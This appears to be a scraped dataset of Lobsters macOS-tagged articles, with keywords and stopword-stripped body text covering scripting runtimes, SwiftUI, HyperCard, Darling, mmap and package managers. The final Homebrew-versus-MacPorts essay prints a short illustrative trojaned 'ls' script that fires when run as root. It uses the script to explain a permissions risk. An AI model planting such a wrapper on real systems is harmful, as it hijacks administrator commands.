developer need include runtime exact library use full scripting language installation apps already taken route keep using java many modern apps rely electron framework includes node run javascript look size different part installation see shipping separate copy runtime would ever come ahead electron framework single app larger entire systemprovided perl brett terpstra considering integral runtimes daily use mac real annoyance fully capable installing still find decision baffling might huge blow impediment anyone us project terminal nerd question wrap head around real benefit apple line reasoning great keeping runtimes date actually boon requiring le effort keep script working every o release runtimes even touted selling point past microsoft starting add tool like default window install including sexy terminal apple moving opposite direction brent simmons one people use whatever system peter n lewis something occurred break every single script usrbinperl irretrievably since usrbin sip protected directory every one need edited brent simmons install pythonrubyetc manually gatekeeping might easy pro easy everybody brent simmons going ask person figure install ruby oneclick installers going ask figure one actually reputable safe curiosity like one way new developer made worry le mac tinkerable outofthebox fewer developer get nick heer something feel arbitrary inherently wrong beautiful thing macos visually coherent interaction layer user spend time anyone including lunkhead like fire terminal time run script capability one fingertip surface well program like homebrew macports make mac feel limitless applescript mac macos catalina perl programming pyobjc python ruby top post unix window stay uptodate subscribing comment r feed post
192,Lobsters,mac,Apple macOS,Use zsh as the default shell on your Mac,https://support.apple.com/en-us/HT208050,use zsh default shell mac,zprofile bashprofile zshrc bashrc profile zprofile bashprofile zprofile zshrc,using bash profile set environment variable alias path variable switch using zsh equivalent example zprofile equivalent bashprofile run login including ssh zshrc equivalent bashrc run new terminal session using profile posixcompliant profile make zsh automatically read setting adding command zprofile e profile emulate sh c source profile also move setting bash profile zsh profile without modification example set environment variable export zsh recognizes different set prompt specifier bash cleaner syntax specifying colorized output eliminating need use complex ansi escape sequence example syntax default bash prompt bashprofile export e h e e w e convert bash prompt zsh prompt using zprofile zshrc export f f see zsh man page detail
193,Lobsters,mac,Apple macOS,SwiftUI,https://developer.apple.com/xcode/swiftui/,swiftui,declarative syntax design tool drag drop dynamic replacement preview native apple platform,declarative syntax swiftui us declarative syntax simply state user interface example write want list item consisting text field describe alignment font color field code simpler easier read ever saving time maintenance declarative style even applies complex concept like animation easily add animation almost control choose collection readytouse effect line code runtime system handle step needed create smooth movement even deal interruption keep app stable animation easy looking new way make app come alive design tool xcode includes intuitive new design tool make building interface swiftui easy dragging dropping work design canvas everything edit completely sync code adjoining editor code instantly visible preview type change make preview immediately appears code xcode recompiles change instantly insert running version app visible editable time drag drop arrange component within user interface simply dragging control canvas click open inspector select font color alignment design option easily rearrange control cursor many visual editor also available within code editor use inspector discover new modifier control even prefer handcoding part interface also drag control library drop design canvas directly code dynamic replacement swift compiler runtime fully embedded throughout xcode app constantly built run design canvas see approximation user interface live app xcode swap edited code directly live app new feature swift preview create one many preview swiftui view get sample data configure almost anything user might see large font localization dark mode preview also display ui device orientation native apple platform swiftui built decade experience creating innovative intuitive user interface world everything user love apple ecosystem control platformspecific experience beautifully presented code swiftui truly native apps directly access proven technology platform small amount code interactive design canvas
194,Lobsters,mac,Apple macOS,WWDC 2019,https://www.apple.com/apple-events/livestream/,wwdc,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
195,Lobsters,mac,Apple macOS,Homebrew Bundle,https://github.com/Homebrew/homebrew-bundle/blob/master/README.md,homebrew bundle,homebrew bundle requirement homebrew linux homebrew cask mascli whalebrew installation usage section output note vagrant test copyright license,homebrew bundle bundler nonruby dependency homebrew homebrew cask mac app store whalebrew requirement homebrew macos linux installing dependency homebrew cask optional used installing mac application mascli optional used installing mac app store application whalebrew optional used installing whalebrew image installation brew bundle automatically installed first run usage see brew bundle section brew man output brew bundle help example brewfile brew tap tap homebrewcask brew tap custom git url tap usertaprepo http user bitbucketorguserhomebrewtaprepogit set argument brew cask install command caskargs appdir application brew install brew imagemagick brew install withrmtp brew service restart version change brew denjinginxnginxfull args withrmtp restartservice changed brew install always brew service restart brew link brew unlink mysql installed brew mysql restartservice true link true conflictswith mysql brew cask install cask googlechrome brew cask install appdirmyappsapplications cask firefox args appdir myappsapplications brew cask install usrlibexecjavahome failfast fails cask java unless system usrlibexecjavahome failfast ma install ma id whalebrew install whalebrew whalebrewwget note homebrew support installing specific version library recent one good mechanism storing installed version lock file software need specific version perhaps want look using vagrant better match development production environment test test run bundle install bundle exec rspec copyright copyright c homebrew maintainer andrew nesbitt see license detail
196,Lobsters,mac,Apple macOS,The Future of Interaction,https://furbo.org/2019/05/28/the-future-of-interaction/,future interaction,treatise marzipan thread update june apple problem marzipan view welcome addition arrival new interaction argument decade ago recent attempt declarative interaction declarative programming declarative view made similar observation react amber,shortly finishing treatise marzipan started thinking lie beyond initial thought made thread twitter post considered addendum hell long footnote either case want start reading thought marzipan happening year start major shift going build apps everyone else making prediction wwdc find one making beyond update june turn making prediction apple problem get thinking future let look problem apple today many product many platform historically person one computer deal several generation mainframe recently pc one disruptive change started iphone need juggle two computer watch generating displaying data another computer increasingly audio video device living room added mix syncing cloud service help manage data know challenge keeping consistent view many machine imessage developer think product work io macos watchos get pas tvos small consolation situation exists various combination apple major apps music calendar reminder note mail etc likely apps share common data model probably supported internal framework shared amongst platform leaf view controller area code shared marzipan view insight easy see marzipan way towards view share code uiview used tv desktop wrist pocket big win developer productivity also win designer productivity share app design element already see apple crossplatform apps color calendar match speech bubble message shape note share special glyph everyone excited know dark mode io going look like guess people running dark user interface mac already seen hard find balance readability contrast dark element see apple designer making major change next week announcement certainly refinement make sense throw huge amount work already done also see mac leading way technique provide vibrant interface allow customer customize device accent color system preference would welcome addition io setting app lead common appearance across platform near future nice place architecture shared model design shared view leaf u one final problem solve share interaction controller arrival new interaction apple tie interaction platform associated hardware mac interaction different io watchos one different io tvos limited four arrow key two button interaction swipe appear multiple platform whole platform different approach let customer get device purchase start think interaction shared amongst platform wise consider new hardware might arriving soon past year apple putting lot effort augmented reality ar doubt hard work current device ar great demo iphone ipad reality hold device front face extended period time arm get tired minute made argument decade ago everyone getting excited multitouch display coming desktop still hold true dumb idea like ar mobile phone apple solve problem new hardware device run headgearos new completely different interaction message developer mean writing new code yet another platform yay twist story rumor ipads mouse mac touch screen let forget interaction voice command using siri technology add situation complexity product increasing exponentially new device interaction introduced better way crossplatform framework long history sucking ever used java app early day mac o x know immediately talking interaction different universe design system least common denominator limited set capability exposed felt wrong recent attempt success still fail address problem everexpanding interactivity apple road see making journey instead see taking new forward thinking direction bold pragmatic change apple famous setting next decade user interaction could one else industry declarative interaction matt gallagher note slowly heading towards declarative programming style declarative programming describing system using set rule relationship rule relationship changed lifetime system invariant dynamic behavior system must part description beginning syntactically declarative programming often assembling whole system rule either single expression domainspecific language whose structure reflects relationship rule system layout inherently declarative task layout set rule auto layout call constraint apply content view ideally entire lifetime content constraint programming sometimes considered subdiscipline declarative programming pull together experience prediction swiftonly framework declarative view independently john gruber made similar observation general idea rather writing classic procedural code say make button configure button position button inside view instead declare button attribute using form html probably easily understood example html procedurally create element like paragraph image table declare tag attribute markup opinion limiting thinking view layout shortsighted address interaction problem ever increasing set platform new framework let declare view also behavior enable developer would describe interaction app support would relationship declared interaction immutable information would processed user interface framework app behavior would determined runtime compiled think would work using auto layout point comparison declarative system came along worried frame placement worry relationship frame let system pick best interaction still tight coupling user action app behavior tapping button swipe gesture invokes code directly declarative interaction would layer abstraction customer app reacts using auto layout help form thinking interaction class functioned like size class ipad would behave always plugged mouse point interact device adapts control could get smaller increased pointing accuracy view could gain hover state display additional information drag drop could change longer depends two finger mechanical wheel could replace finger scrolling kind adaptability would work across platform app would behave differently running augmented reality tv screen developer worry kind hardware available worry customer used perform task going predict would accomplished yes could draw inspiration react similar technology thing confident point apple know problem working actively solve platformindependent fashion marzipan first step described amber next step
197,Lobsters,mac,Apple macOS,"30-plus years of HyperCard, the missing link to the Web",https://arstechnica.com/gadgets/2019/05/25-years-of-hypercard-the-missing-link-to-the-web/,year hypercard missing link web,update old macintosh soon eulogy clarisworks confessed approach computer lib computer chronicle program compuserve theodore nelson neverfinished project xanadu computer libdream machine unveiled project busily worked unix grant national science foundation explained,computer lab beyond cyberpunk hypercard stack update memorial day weekend u ar staff long weekend accordingly many spend time relaxing traveling family maybe someone dust old macintosh fire hypercard beloved bit apple software development kit preweb era application turn later summer staff thought time resurface look hypercard legacy piece originally ran may hypercard approached anniversary appears unchanged sometime around landlady cut deal would purchase macintosh computer would buy external hard drive would leave system living room share used device since computing ibm wanted keep apple development set mac sat one evening noticed program application menu hypercard wondered opened app read instruction hypercard allowed create stack card visual page macintosh screen could insert field card showed text table even image could install button linked individual card within stack played various sound user clicked mostly notably boing clip day ca nt get mind could also turn picture button hypercard included scripting language called hyper talk nonprogrammer like could easily learn allowed developer insert command like go play sound dissolve component hypercard array intrigued began composing stack none amounted anything doodlepacked matrix image sound aphorism eventually glanced wrist watch startled quite tired turned vision stack button dancing head month glanced historical watch hypercard soon noticed editor note turn ever happened searched around found venture entrepreneur coder tim oren eulogy program written week apple withdrew software market hypercard problem argued apple never quite figured software thing oren wrote programming user interface design tool lightweight database hypertext document management system multimedia authoring environment apple never answered question cupertino company exiled program claris subsidiary got lost amidst prominent project like filemaker clarisworks office suite hard core supporter particularly educational community kept alive apple reabsorbed claris sufferance oren epitaph continued even cancellation hypercard inventor saw end coming angstfilled interview bill atkinson confessed big mistake figured stack could linked cyberspace installed particular desktop thing would different missed mark hypercard atkinson lamented grew boxcentric culture apple grown networkcentric culture like sun hypercard might first web browser blind spot apple prevented making hypercard first web browser hypercard may first web client anniversary release approach think deserves prominent place history internet computer lib original hypercard disk year hypercard unveiling san franciscobased television show computer chronicle produced program software host episode quickly identified program inspiration hypercard based upon hypertext gary kildall told stewart cheifet concept developed ted nelson doug engelbart sixty basic idea trying research kind subject subject matter exists kind different place book magazine tape recording compuserve somehow link stuff electronically click beethoven sudden jump one next hypertext hypercard bird theodore nelson proposed hypertext concept early tried implemented neverfinished project xanadu undaunted nelson morphed eloquent evangelist idea book computer libdream machine defined hypertext form writing branch perform request best presented computer display screen simplifying process dispersing accessing information hypertext hypermedia could liberate society nelson saw overprofessionalized digital information elite hypercard jazz hipster saying go war important left general nelson wrote guardianship computer longer left priesthood priesthood actually pretty good job cutting technology loose three year release computer lib architect defense department prototype version project public event washington dc meanwhile two engineer bell lab busily worked unix operating system would become backbone net fearing antitrust reprisal government strayed software marketing business leased unix college university bargain basement rate school supported grant national science foundation built hundred thousand arpanet node took internet programmer cern switzerland huge physic laboratory proposed kind hypertext network use site system available today use single database tim bernerslee explained accessed many user using distributed file system product take ted nelson idea wide docuverse literally allowing link node different database bernerslee determined build one
198,Lobsters,mac,Apple macOS,Mac Toolbar Labels and Accessibility,https://mjtsai.com/blog/2019/05/22/mac-toolbar-labels-and-accessibility/,mac toolbar label accessibility,james riordon rob griffith option nstoolbar nswindowtitlehidden daniel jalkut peter saathoffharshfield brent simmons hidden preference john gruber macos human interface guideline accessibility apple mail cocoa design esoteric preference mac mac app store macos mojave marsedit omnifocus readkit top post xcode comment r feed,james riordon dad yr old developed cognitive issue including inability reconcile symbol use apple mail anymore mail compose window removed ability show text label button thanks timcook happy global accessibility awareness day may rob griffith continues depressing text label available button many year nowapple may done save vertical space ironic using text least amount space possible prefer see icon text option nstoolbar app set user configure however window us nswindowtitlehidden hide title another accessibility problem put toolbar title bar toolbar get locked icononly mode first thought titlefree design intended singlewindow apps apple also us safari xcode appearing thirdparty apps like marsedit omnifocus shame update daniel jalkut ideally apple would fix mode kind appropriate compromise could made support streamlined titlebarfree mode also supporting display label holding breath though hopefully workaround marsedit give either prefer outright depend upon label accessibility reason something tide peter saathoffharshfield often find voiceover way discover button inscrutable icon also window distinct title bar leave little space click drag window zooming way find tiny grab spot brent simmons hugely important aspect developer follow apple lead come app design trying find apple apps allow button title found far mail iwork apps iwork apps documentbased mean window need title obvious example finder allows button label documentbased automator preview script editor documentbased xcode support multiple window documentbased yet allow window title button label think style basically new brushed haphazardly apple therefore thirdparty developer well omnifocus documentbased support multiple named window put title giant text title bar actually leaf le room content previous version allow toolbar label however colored text help show visually consistent io app fact lot apple apps thirdparty apps even configurable toolbars shame least safari apps michael mention netnewswire rearrange item liking choose item want see simmons netnewswire app use window title hidden preference change enable toolbar label john gruber think real accessibility issue another instance something look better least people work worse also think problem exacerbated current style icon simple onecolor hairline outline object colorful illustration actual object update macos human interface guideline title bar visible hidden immersive app like game provide title unless enough context one unnecessary provide short descriptive label every toolbar item user see label configure toolbar show icon text text seems extent apple guidanceaccessibility apple mail cocoa design esoteric preference mac mac app store macos mojave marsedit omnifocus readkit top post xcode stay uptodate subscribing comment r feed post
199,Lobsters,mac,Apple macOS,(Don't Fear) The Reaper,https://www.highcaffeinecontent.com/blog/20190522-(Dont-Fear)-The-Reaper,nt fear reaper,reminiscing twitter openstep relatively simple announced,rapidlyupcoming introduction uikit apps mac reminiscing twitter quite bit apple transition mac o x nextstep mac o found common ground despite two different os architecturally design standpoint couple different vector follow permit converge place one artifact final day next prerelease version nextstep despite appearing openstep operating system succeeded nextstep nextstep build abbreviate herein vastly different ui set apps new colored window chrome background image tabbed shelf bottom screen quite departure grayscale nextstep knew however builtin apps piqued interest redesigned rebuilt variant many apps shipped nextstep none change later made openstep fact nt resurface year later apple acquires next revamps openstep mac look feel project named rhapsody later became mac o x server fun track progression apps period let take look version mail follow way o x mail prerelease nextstep next recently sun finalized openstep confused openstep o crossplatform refactor sweeping revamp old nextstep framework seemed acrosstheboard revamp system apps take advantage openstep apps thanks openstep portability would run solaris window well next o however next actually shipped next version o renamed openstep nextstep nt include instead openstep older ironically preopenstep set apps despite shipping year beta tell immediately looking mail step backward mail openstep seems obvious hindsight fancy upgrade next working put shelf realized company future without acquisition perhaps build intended woo potential buyer like apple sure enough rhapsody includes revamped apps getgo mail rhapsody rhapsody apple first attempt merging world macintosh next architecturally much nextstep first build rhapsody released developer august seven month acquisition closed design goal developer beta relatively simple port openstep powerpc adopt mac hig design language iconography provide finder desktop see progression left openstep rhapsody developer release right mac o x serverrhapsody next ui nt maclike machine designed unix workstation professional academic market almost feel ui design language openstep mac o mouse keyboard os nt mean transitioning straightforward multitasking different menuing different famously next o never desktop menu bar across top screen even something simple like scrollbars control take granted today left nextstep apple teach next appkit maclike meant required lot work many year mac o x server maclikeness mac o x server still controlled preference key appkit fact switch completely revert system back looking like openstep wild experience mac o x server looked acted much like mac o pro look feel mac retained power unix next framework even built upon next feature like menu could tear float onscreen however mac o x server fatal flaw become apparent apple year since next acquisition mac o x server nt run legacy mac apps mac developer board rewriting everything completely objectivec appkit mac o x actually work successor mac o apple customer going gut start solution apple going port legacy mac o toolbox new compatibility library called carbon make linchpin consumer mac o x experience even apple knew wanted consumer rhapsody something special however became clear apple needed rethink strategy completely mac o x became completely different thing mac o x server preceded tentpole change would replace kernel driver model replace display postscript rendering pdfbased quartz deeply integrate carbon make legacy mac apps firstclass citizen adopt brand new ui called aqua lot next pure foundation framework rearchitected atop common foundation carbon classic mac o appearance manager became basis aqua ui appkit menu widgetcontrol rendering replaced mac o foundation course meant carbon apps cocoa appkit apps would look despite vastly different architecture apple needed show developer carbon going real valid way forward temporary stopgap committed using carbon mac o x finder carbon version finder introduced mac o x developer preview aqua revealed acted bit like next single root window file viewer toolbar column view secondary window stage apple nt quite know systemwide toolbars inherited nextstep mac o x developer preview first time saw aqua build came transformational change mac o x ui year three apple transition next technology apple path finding maclike rather trying match classic mac o apple better understanding wanted navigation finder element ui still comically oversized finder evidence transition carbon side revisit mail see appkitcocoa faring o release mail mail saw earlier piece look different indeed still betrays next root iconography preference window clearly look similar carbonbased finder see environment starting come together something new shared design language mac o x shipped consumer refined massively first implementation aqua mail mac o x appkit finder mac o x carbon taken apple four year find new maclike template mac o x followed ever since eighteen year later element mac o x ui still recognizable today much think mac experience today came nextstep mac o appkit toolbars service tooltips multicolumn table view font color picker idea dock application bundle installer package home folder multiple user might even hardpressed find carbon app application folder today apple announced wo nt even run next version macos apple got chance complete doover mac o x modern architecture optimized touchscreen device powerful gpus thermal resource battery constraint doover course iphone o instead appkit come way nextstep refactored rebuilt openstep powered first decade mac o x apple apple decided build something fresh everything learned uikit technology progressed uikit device power become complex powerful macos uikit finally coming back mac serve toptier native application development framework alongside appkit start apple next transition like last time almost unfathomably difficult see two completely different architecture cooperate find common ground like last time start baby step uikit adopting metric style macos appkit adopting interaction io two side growing closer time sharing dna like last time road ahead much longer see perspective building towards come next even nt yet know really interesting question probably wo nt answer year come whether uikit carbon cocoa transition think appropriate answer yes uikit present developer ecosystem bring incredibly important appkit also present provides power mac know sure great genredefining apps uikit appkit mac carbon itunes photoshop microsoft office final cut pro eighteen year carbon finally reaching end date transition apps cocoaappkit complete appkit still eighteen year left ahead think mac fine classic mac o nextstep came end mac think everybody agree unified whole much greater sum part clear future still written mac developer io developer alike get help shape need cowbell
200,Lobsters,mac,Apple macOS,Translating an ARM iOS app to Intel macOS using Bitcode,https://www.osnews.com/story/130038/translating-an-arm-ios-app-to-intel-macos-using-bitcode/,translating arm io app intel macos using bitcode,home mac o x translating arm io app intel macos using bitcode bitcode decided test theory author thomholwerda,home mac o x translating arm io app intel macos using bitcode translating arm io app intel macos using bitcode bitcode well bitcode small b architecturespecific intermediate representation used llvm capitalb bitcode pertains set feature allowing embed representation macho binary mechanism provide apple app store submission course specter macos arm public psyche many year many pondered whether bitcode make transition straightforward commonly held belief bitcode suited massive architectural change like moving intel armi unconvinced decided test theory steven troughtonsmith know going learn bargained author follow twitter thomholwerda
201,Lobsters,mac,Apple macOS,Darling Progress Report Q1 2019,http://blog.darlinghq.org/2019/05/darling-progress-report-q1-2019.html,darling progress report,summary progress introduction jack git work darling homebrew progress towards xcode support multithreading work python threading xtrace outlook community useful link website darling github wiki,summary progress darling made good progress first quarter total issue closed january march work continues gui app support thing holding u back lack support running debugger lldb darling last summer luboš took care complicated task involved delving darling multithreading mach apis capped loading macho binary kernel meantime sergey putting lot work getting new cocoa stack work produced exciting result last thing preventing u announcing shipping basic gui application support trouble around loading linux native opengl driver file loading native linux thing nt reliably work current mechanism filesystem virtualization based mount namespaces chrooting luboš working replacement dubbed vchroot virtual chroot onetime fix issue progress stalled due time constraint would also like welcome jack howell newest member project accomplishment would like highlight introduction jack would like welcome jack howell darling bit excited see recent progress around darling think might time community develop software solution similar wine macos application many commercial application game available macos darling might special place ever coming still yet fully mainstream compatible desktopworkstation linux experience current goal help amazing people behind darling project get state darling able run commercial application utilize minimal set macos apis one theoretically feasible run short term fair bit popular game right category secret would like see linux gaming advance even hopefully future include darling point technical side looking current issue cocotron stack blocking specific game startup trying bring darling sergey invaluable source help process based mostly guidence sent initial set patch resolved issue see application continue testing troubleshooting see next area need tackle git work darling issue fixed sergey popular versioncontrol software git would crash executing indexpack routine routine typically happens cloning repository git previously pretty much useless darling git working software development darling become reality perhaps even significant step towards getting homebrew working relies git extensively next step getting homebrew run http support curl require work corecrypto effort towards getting curl work already completed including getting securityd run progress towards xcode support step forward made andrew running apple xcode ide xcode gui working darling foreseeable future issue preventing program xcode command line tool resolved closed issue documented effort resulted hundred missing constant class added darling system framework attempting run xcodebuild discrepancy darling determined bundle path framework issue exposed promptly fixed command line tool still nt work run xcodebuild like workarounds exist running much closer fully supporting clt multithreading work python previously darling failed support python program use threading module thanks luboš issue fixed xtrace sergey working improving xtrace darwin syscall tracing tool addition syscall name xtrace display argument passed syscalls formatting appropriately integer pointer string featuring basic syntax highlighting case many mach trap frequentlyused bsd syscalls xtrace even display argument symbolically displaying value passed open call owronly ocreat otrunc general xtrace mostly par aspect better dtruss tool available macos coolest new xtrace feature support parsing displaying mig routine call whenever traced process sends receives mach message xtrace print short description message destination reply port size message body mig tracing support xtrace additionally decode remote procedure call rpc message actually encodes display call similarly display syscalls complete argument return value make lot easier debug issue related interprocess communication mach ipc mig particular pervasively used darwin everything logging inspecting debugging process xtrace work complete yet close completion merged near future outlook macos release announced wwdc year application cease function xcode already lack support targeting macos using sdk included hand darling plan remove support result may increase demand darling techsavvy people try find way run apps wish accelerate development much possible spark interest project leading macos release big opportunity growth apple also rumored transition towards arm architecture mac hard see arm replacing intel desktop mac possible macos someday abandon architecture well aim keep community updated progress darling given level activity seems fit write four progress report per year hope lot good news progress time next progress report come around community important know people want use darling order properly prioritize project development usual request application xcode quite interesting us darling linux based continuous integration ci server need macosonly software popped recently something want use darling may obvious please comment useful link website darling github wiki
202,Lobsters,mac,Apple macOS,Use mmap With Care,https://www.sublimetext.com/blog/articles/use-mmap-with-care,use mmap care,sublime merge example project caveat sigbus caveat window sublime merge google breakpad caveat party caveat support sublime merge sublime text sublime merge alternative sublime merge sublime merge,implemented git portion sublime merge chose use mmap reading git object file turned considerably difficult first thought using mmap desktop application serious caveat follow along example project say reading binary format data need throughout application take easiest approach use simple read get full content file release software someone come along say need parse file memory could make using much memory course want help searching come conclusion memory mapping perfect solution problem memory mapped file work mapping full file virtual address space using page fault determine chunk load physical memory essence allows access file read whole thing memory without actually crucially requires small change codebase fixed memory usage issue fixed bug people happy well get another support ticket program crashing sigbus caveat sigbus sigbus bus error signal happens try access memory physically mapped different sigsegv segmentation fault segfault happens address invalid bus error mean address valid failed readwrite turn ticket come someone using networked drive network happened disconnect memory mapped file open since file longer existed o could nt load ram gave sigbus instead o loading file demand wonderful issue arbitrary read address memory mapped file fail point luckily posix system signal handler sigbus signal handle need register signal handler sigbus program start jump back code handle failure sadly code actually edge case consider signal handler global signal perthread need make sure messing thread making data thread local let also add robustness making sure called setjmp longjmp using setjmp longjmping signal handler actually unsafe seems cause undefined behaviour especially macos instead must use sigsetjmp siglongjmp since jumping signal handler need signal handler block future signal must also pas sanodefer sigaction starting get quite complicated especially multiple place sigbus could happen let factor thing function make logic little cleaner need remember always call installsignalhandlers every application wrap file access safemmaptry annoying manageable covered posix system window caveat window window nt mmap mapviewoffile implement memory mapped file one important difference window keep lock file allowing deleted even window flag filesharedelete deletion work issue expect another application delete file u git garbage collection one way around window api essentially disable system file cache entirely make everything absurdly slow way sublime merge handle releasing memory mapped file idle pretty solution work window also sigbus signal trivially use structured exception handling safemmaptry instead well application function window decide would like crash reporting make easier identify issue future add google breakpad unbeknownst broken linux macos caveat party problem using signal handler global across thread library added library like breakpad us signal internally going break previously safe memory mapping breakpad register signal handler initialization time linux including one sigbus signal handler override installation order important nice solution type situation ca nt simply set reset signal handler safemmaptry would break multithreaded application sublime hq solution turn unhandled sigbus signal handler sigsegv particularly elegant reasonable compromise macos thing get little complicated xnu macos kernel based mach one earliest microkernels instead signal mach asynchronous message based exception handling mechanism compatibility reason signal also supported mach exception taking priority library breakpad register mach exception message handle prevent signal fired course odds signal handling workaround found far involves patching breakpad handle sigbus party library problem signal global state accessible everywhere available solution unsatisfying workarounds caveat support memory mapping may use physical memory require virtual address space platform address space application may use memory run address space try memory map large file result memory sadly nt workaround like issue hard limitation memory mapping work either rewrite codebase memory map whole file live crash system support sublime merge sublime text took support route sublime merge build available sublime text disables git integration version alternative mentioned rewrite code use memory mapping instead passing around long lived pointer memory mapped file around codebase use function pread copy portion file require memory le elegant initially using mmap avoids problem otherwise going quick benchmark way sublime merge read git object file pread around fast mmap linux hindsight difficult justify using mmap pread beast tamed little reason change think missed something made mistake please leave u message forum hope help future endeavour nt already check git client sublime merge
203,Lobsters,mac,Apple macOS,Don’t Pay the Early Adopter Tax,https://justinmayer.com/posts/early-adopter-tax/,pay early adopter tax,hardware guinea pig woe apple acknowledged problem new strategy want notified published new content,used early adopter always loved technological advancement computing consistently among first adopt latest hardware software early adopter terribly high cost fiscal cost although also often applies expensive term time frustration know people upgraded latest annual io release ended bricked device physically replaced others tried upgrade latest macos release got irrecoverably hung narrowly escaped unscathed back previous version operating system lucky enough avoid scenario like early adopter tendency certainly resulted fair share problem hardware guinea pig woe iphone announced stayed late preordered amazed arrived shipped directly shenzen factory doorstep day week followed chagrined find build quality issue problem antennarelated reception week followed apple almost certainly mitigated manufacturing issue silently folk bought phone month later blissfully unaware problem faced slow learn lesson preordered iphone launch day well le year later began experiencing sudden shutdown usually cooler weather even though battery still showed charge credit apple acknowledged problem replaced battery even warranty affected affected folk ordered phone launch day like waited kink get worked would likely another headache avoided new macbook pro touch bar announced nursing along macbook air year beyond ready upgrade highresolution retina display rationalizing away concern unnecessarily lowtravel keyboard questionable touch bar utility ordered new macbook pro launch day arrived experienced sticking key wakefromsleep problem video glitch thankfully everything except keyboard resolved subsequent software update still endure frustrating problem first month owned computer kind software upgrade least reasonable chance subsequent version fixing whatever problem created prematurely upgrading one nice thing software hardware manufacturer may may fix problem due cost scale involved hardware early adopter carry particularly high cost new strategy exception buy hardware launch day longer wait month two proverbial dust settle addition waiting manufacturing issue sorted extra time also allows read postlaunch review affords benefit making clearerheaded betterinformed purchase decision another recent change habit inclined buy proven battletested design iphone x announced waited bought iphone iphone x new screen face id shiny feature appeal ultimately decided firstgeneration component would le likely provide reliable troublefree experience touch id moreproven iphone design choice software side wait least several month upgrading latest annual macos release time period hundred hundred annoying bug fixed none ever affect plus use variety plugins custom extension take time updated compatibility major macos upgrade time upgrade latency increasing mojave nearly two year still little incentive upgrade high sierra catalina chance similarly hold major io upgrade least subsequent even release would probably wait even longer security update backported previous io version mention fact io upgrade oneway trip way revert apple virtually mandate upgrade via aggressive nag dialog topic another day remember tempted buy upgrade launch day consider high cost guinea pig wallet sanity thank want notified published new content
204,Lobsters,mac,Apple macOS,Thoughts on macOS Package Managers,https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/,thought macos package manager,homebrew macports brief history package manager macos fink opendarwin architecture explicitly eschew root troubleshooting guide multiple found internet recommends macports philosophy macports registry database daytoday usage package availability port shy usability feature quite well documented project community macports many time homebrew uncertain term file issue interested collecting information yell distilling issue quite bit conversation discussion moving forward conclusion,couple month ago uninstalled homebrew migrated configuration macports lot thinking state package management macos come based experience using interacting development community brief history package manager macos package management macos somewhat complex history mostly owing fact unlike linux distribution macos ship default package manager box surprising one first project solve problem package management fink created early initial release predating mac o x several month using debian dpkg apt backend fink still actively maintained though looked closely macports hand released part opendarwin homebrew released seven year later solution many shortcoming author saw macports case obvious introduction two talking sorry fink architecture macports homebrew try solve problem really designed quite differently difference become immediately evident start using personally feel macports clearly better architected mature package manager two sudo sudo homebrew make several questionable design decision one deserves section choice explicitly eschew root fact refuse work run way fundamentally bad idea package manager install software user computer homebrew default always require elevated privilege function correctly decision important consequence security usability especially advent system integrity protection o x el capitan quite homebrew essentially considered owner usrlocal metaphorically literally would change permission directory point would thing like plop readme directly folder rootless introduced moved file subdirectory however maintain charade sudoless installation homebrew still trash permission folder inside usrlocal homebrew troubleshooting guide list reinstalling macos set permission back supposed break homebrew process command fail permission error check permission usrlocal subdirectory unsure run cd usrlocal sudo chown r whoami bin etc include lib sbin share var opt cellar caskroom framework telling user use sudo hammer smash permission issue arise result system trying fix damage caused supposedly sudoless software quite ironic bad practice teaching user fix problem blindly running sudo chown r really bad bad advice make homebrew completely unusable multiuser system open security hole actually multiple usrlocalbin shared first path hard see changing permission directory lead trouble consider malicious shell script running privilege current user perhaps something found internet make file usrlocalbinls binbash id u eq echo pwned nt happen run sudo l else l move along nothing see fi boom l boobytrapped everyone system note installing homebrew another prefix would solve problem unfortunately broken point homebrew recommends shame since ability install package local path eg brew useful case dropping sudo actually make sense macports philosophy macports hand swing far direction actually borderline inconvenient use sense philosophically macports different perspective work try prevent conflict system much possible achieve set hierarchy opt annoying bit directory path default picked compiler without prodding course design mean single shared installation among user running port requires elevated privilege whenever performing operation affect user admittedly time macports smart though shed permission run macports user whenever possible line stated philosophy prevent conflict macos macports set tool isolation provided system fact build run sandbox macports user attempt access file outside build includes system intercepted blocked mean macports need install duplicate tool whereas homebrew try use one come system possible downside onetime upfront cost installs base package upside approach significantly contained make easier manage likely continue working macos change finally macports seems lot thought put regard certain aspect example macports registry database backed sqlite default make easily introspectable case something go wrong another useful feature builtin livechecks port codify upstream version check make easy see macports package index need updated daytoday usage architecture aside package manager useful possible actually use couple subareas feel important look package manager turn package availability nominally macports port port available install default homebrew shy formula plus couple thousand homebrewcask course thing really tell u lot package number pretty meaningless contain thing like versioned package kind numberinflation looking popular established package neither disappoint package like gcc vim wget available uptodate macports homebrew availability start differ lesserused package macports seems quite older package homebrew never picked homebrew likely newer package homebrew slightly uptodate think likely result fewer package manage support job well increased proclivity remove package hard get working latest version macos overall think fair say either package manager advantage ultimately come end needing switching two almost guaranteed going something conspicuously missing new package manager annoy usability homebrew aim simple easy use general true neutral use beerrelated terminology emoji judicious use color quite helpful wellformatted output common usecases straightforward though occasionally command end surprising thing use strange way macports hand mean unusable polished homebrew lack color well somewhat cluttered le relevant output make bit le pleasant work couple patch apply get behavior want expecting user unreasonable course however overall macports handle complex quite well pretty serviceable used another package manager two package manger differ distribute package macports almost always build package source homebrew continuously gotten le le permissive letting opting instead downloading prebuilt binary usability perspective binary clear winner package install much quicker usable nearly immediately leave computer barely usable compiling newest version llvm last four hour overall however le problem may seem first since package small build relatively quickly making long port upgrade outdated invocation quite rare feature package manager basic functionality expect package manager macports generally much full featured homebrew part probably result architectural disparity one example homebrew set command manage dependency tree somewhat limited unfortunate limitation somewhat reasonable given underlying design would make implementing feature difficult le justifiable homebrew habit missing useful slightly lesscommonly used functionality mentioned extreme case removing feature entirely crippling significantly le usable dubious category go useful functionality like ability find install older version software customize formula built installed comparison macports provides hook enable user alter almost every step build process way enabling optional feature want enable readline support customizing flag passed configure script make macports slightly complex make consistent like specifier like installed outdated used command expecting port name quite well documented amount time using macports think ever felt like missing anything important experienced constantly using homebrew project community reason chose leave homebrew macports one far largest also personal opinionated direct disillusioned direction homebrew moving perspective user contributor software well participant opensource community feel homebrew become increasingly userhostile clear homebrew broken project mean saying involved project bad people feel decision made beneficial damaged trust project fundamentally believe fixable issue remain optimistic problem resolved least addressed currently stand though feel macports better experience overall least short time using interacting community macports year interacted many different opensource community almost case experience positive 